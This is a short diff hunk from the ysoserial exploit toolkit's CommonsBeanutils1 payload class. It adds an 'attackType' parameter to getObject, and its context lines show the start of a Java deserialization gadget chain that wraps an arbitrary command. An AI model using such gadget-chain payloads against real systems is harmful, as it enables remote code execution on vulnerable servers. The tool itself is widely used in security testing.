@@ -16,7 +16,7 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.FROHOFF })
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
+	public Object getObject(final String command, String attackType) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
